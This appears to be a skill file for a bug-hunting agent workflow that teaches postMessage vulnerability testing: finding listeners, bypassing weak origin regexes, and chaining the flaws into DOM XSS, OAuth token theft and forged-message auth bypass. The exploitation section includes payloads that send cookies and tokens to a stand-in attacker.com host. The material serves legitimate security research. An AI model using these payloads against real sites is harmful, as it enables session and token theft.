---
name: postmessage-xss-testing
description: Cross-window `postMessage` vulnerability testing — finding `window.addEventListener('message', ...)` handlers that trust cross-origin messages without validating `event.origin`, and `postMessage(...)` senders that broadcast sensitive data with a wildcard (`'*'`) `targetOrigin`. Covers listener discovery (source-code grep, DevTools Global Listeners breakpoints, Burp DOM Invader/postMessage-tracker), origin-validation bypass techniques (no check at all, and weak-regex bypasses via subdomain/substring tricks like `payments.example.com.attacker.io`), and the resulting exploitation chains: DOM XSS via unsanitized `event.data` reaching a dangerous sink (`innerHTML`, `eval`, `location.href` with a `javascript:` URI), OAuth-token/session-credential theft from wildcard-broadcast messages, and forged-message auth bypass. Use this during Phase 3 (Vulnerability Testing — Client-side) of bughunting-workflow on any target using iframes, popup windows, OAuth/SSO callback flows, embedded widgets, or cross-origin communication between a parent page and an embed/payment iframe. Also trigger on mentions of postMessage, addEventListener('message'), targetOrigin, event.origin, DOM Invader, or cross-window messaging.
---

# PostMessage Vulnerability Testing

Technique library for cross-window `postMessage` communication bugs. Each dated entry below is a validated technique pulled from a real writeup — add new entries here (don't create a new skill) whenever a new writeup covers a different discovery method, bypass primitive, or exploitation chain than what's already recorded.

## Core theory

`postMessage` is the browser's sanctioned way for two different origins (a parent page and an iframe, a window and a popup it opened) to talk to each other despite the same-origin policy blocking every other direct access path between them. That's exactly why it's dangerous when misused: the *sending* side can broadcast to any origin by passing `'*'` as `targetOrigin`, and the *receiving* side gets a message object with an `event.origin` field it is entirely optional to check — nothing in the API forces either side to validate anything. The bug isn't in the API; it's in the assumption, on one side or the other, that "only my own trusted page could possibly send/receive this."

This produces two independent, separately-testable failure modes:
- **Missing/weak origin validation on the listener** — any page (attacker-controlled) can send a message the app treats as trusted, because the receiving handler either never checks `event.origin` or checks it with a flawed pattern.
- **Wildcard `targetOrigin` on the sender** — the app broadcasts data (sometimes including tokens/PII) to `'*'`, meaning *any* origin currently loaded in that window/frame relationship receives a copy, including one an attacker got the victim to open alongside the legitimate flow.

## Listener & sender discovery

**Source-code grep** — the fastest first pass on any JS bundle (pairs directly with `recon-scanning-toolkit`'s JS-analysis section):
```bash
grep -rn "postMessage(" ./app-js/          # find every sending call site — check the targetOrigin argument
grep -rn "addEventListener('message'" ./app-js/   # find every receiving handler — check for an origin check inside
```
Once a handler is found, trace `event.data` forward through the function body looking for it reaching a dangerous sink: `innerHTML`, `document.write()`, `eval()`, `location.href`/`location.assign()`, or a template-literal HTML insertion.

**Browser DevTools — Global Listeners:**
1. Open DevTools (F12) → **Sources** panel (Chrome) or **Debugger** (Firefox).
2. Find **Global Listeners** in the sidebar → expand the **message** entry to see every registered handler on the page, even ones not obvious from static source (dynamically-attached, third-party-script-injected, or minified-and-hard-to-grep).
3. Right-click → **Break on** → add a breakpoint on `DOMWindow.message` (or use `debugger;` injected via console) to pause execution on the next incoming message and inspect the call stack / `event.data` shape live.

**Automated tooling:**
- **Burp Suite DOM Invader** — passively monitors all `postMessage` traffic while you browse a target through Burp's proxy, and can auto-inject canary values into messages to flag whether they reach an exploitable sink.
- **Untrusted Types** (browser extension) — tracks taint flow from sources (including `event.data`) to dangerous sinks in real time, flagging exactly the trace step described above without manual code reading.
- **postMessage-tracker** (Chrome extension) — logs every message sent/received on a page along with the origins involved, useful for quickly seeing whether a wildcard-targeted broadcast is happening at all before diving into source.

## Origin-validation bypass techniques

**No validation at all** — the baseline case; if the handler never references `event.origin`, any origin's message is trusted:
```javascript
// Attacker page, hosted anywhere
targetFrame.contentWindow.postMessage({
    type: 'oauth_callback',
    success: true,
    token: 'sample_token',
    return_url: 'javascript:alert(document.domain)'
}, '*');
```

**Weak-regex origin check bypass** — a common "fix" checks `event.origin` against a regex instead of an exact string match, and a *prefix*-anchored (or otherwise loose) pattern can be satisfied by an attacker-registered domain that merely starts with the expected string:
```javascript
// Vulnerable check on the receiving side:
if (/^https:\/\/payments\.example\.com/.test(event.origin)) { /* trust it */ }

// Attacker registers a domain where the expected string is a legitimate substring/prefix:
// payments.example.com.attacker.io
// → event.origin === "https://payments.example.com.attacker.io" still matches the regex
```
The fix pattern to look for and flag in a report: the regex needs an anchored end (`^https:\/\/payments\.example\.com$`) or an exact string-equality check, not a prefix/substring match — call this out explicitly when reporting, since it's the kind of near-miss fix a dev might reach for without realizing it's still bypassable.

## Exploitation chains

### DOM XSS via `event.data` reaching a sink
```javascript
// Vulnerable listener
window.addEventListener('message', function(event) {
    // no origin check
    const data = event.data;
    location.href = data.redirect_url;   // dangerous sink, no sanitization
});
```
Send a `javascript:` URI or a `data:` URL as the value that lands in the sink to achieve arbitrary JS execution in the target origin's context:
```html
<iframe id="target" src="https://app.example.com/oauth/callback"></iframe>
<script>
window.onload = () => {
  setTimeout(() => {
    document.getElementById('target').contentWindow.postMessage({
      type: 'oauth_callback',
      success: true,
      redirect_url: 'javascript:fetch("https://attacker.com/log?cookie="+document.cookie)'
    }, '*');
  }, 1500); // give the iframe time to finish loading and attach its listener before sending
};
</script>
```

### OAuth token / credential theft via wildcard broadcast
When an OAuth/SSO callback page passes the received token onward to its opener/parent using `'*'` as `targetOrigin`, any origin the victim currently has open in that window relationship receives a copy:
```javascript
// Vulnerable code on the auth/callback page
iframe.contentWindow.postMessage({
    type: 'oauth_callback',
    token: accessToken
}, '*');   // any origin listening receives the token
```
Attacker-hosted listener, opened by the victim alongside (or via a lured popup/tab) the real auth flow:
```javascript
window.addEventListener('message', function(event) {
    if (event.data.type === 'oauth_callback') {
        fetch('https://attacker.com/log?token=' + event.data.token);
    }
});
```

### Forged-message auth bypass
If the app treats an incoming message's `success: true`/similar field as authoritative for completing a login/payment/auth flow, an attacker sending a fabricated message with that flag set — no legitimate backend interaction required at all — can force the receiving page into a "successfully authenticated" state directly.

## Impact framing for report

Per the source, quoted directly: **"Identifying postMessage implementations without demonstrated impact is rarely report-worthy in bug bounty programs."** A missing-origin-check finding on its own is usually bounced by triage — it needs to be chained into one of:
- **DOM XSS** — a working payload that executes arbitrary JS in the target origin (highest severity; full account/session compromise if it lands on an authenticated page).
- **Information disclosure** — a concrete token/PII value actually captured by an attacker-controlled listener, not just "this data is sent via postMessage."
- **Auth/logic bypass** — a forged message that measurably changes application state (login success, payment confirmation) without the legitimate flow completing.
- **DoS** — rare, but a malformed message crashing/hanging the receiving handler is a valid (lower-severity) chain too.

A penetration-testing engagement (as opposed to bug bounty) may still document an insecure handler as a weakness/finding even without a full working PoC — bug bounty triage almost always wants the working chain, so build one before submitting.

## Recorded techniques

### 1. Listener/sender discovery, weak-regex origin bypass, and OAuth-token-theft/DOM-XSS chains (baseline)
Source: [Exploiting PostMessage Vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities)

**Where:** any target using iframes, popup windows, or an OAuth/SSO callback flow that communicates back to its opener/parent cross-origin — payment widgets, embedded third-party auth flows, and chat/support widgets are especially common carriers of postMessage-based data flow.

**Root cause:** the `postMessage` API leaves both origin validation (receiver) and target-origin scoping (sender) entirely optional, so the vulnerability is really a missing-assumption bug on whichever side the developer didn't think to lock down — not a flaw in the API itself.

**Exploit steps:** run the discovery pass (grep + DevTools Global Listeners + DOM Invader) above to find every listener/sender pair; for each listener, check for an origin validation and specifically test whether it's a prefix/substring-matchable regex rather than an exact-match check by registering (or reasoning about) a domain like `payments.example.com.attacker.io`; for each sender using `'*'`, check what data it sends and whether an attacker-controlled listener opened alongside the real flow could intercept it; trace `event.data` in every handler to its eventual sink and test for DOM XSS if it reaches `innerHTML`/`location.href`/`eval`.

**Impact framing:** see the Impact framing section above — don't stop at "no origin check present," always attempt to build the concrete DOM-XSS/token-theft/auth-bypass chain before reporting.

**Generalize note:** this is the cross-window analogue of `csp-misconfig-xss-testing`'s reflected-URL-parameter DOM XSS — same "unsanitized attacker-influenced data reaching a dangerous sink" root cause, just with the injection vector being a cross-origin message instead of a URL parameter. Cross-reference `oauth-redirect-uri-bypass-testing` for the broader OAuth-flow attack surface when a postMessage-based callback is just one leg of a larger OAuth implementation worth auditing end-to-end.

<!-- Add new recorded techniques below this line as new postMessage writeups are processed. Keep the same structure: Where / Root cause / Exploit steps / Impact framing / Generalize note. -->
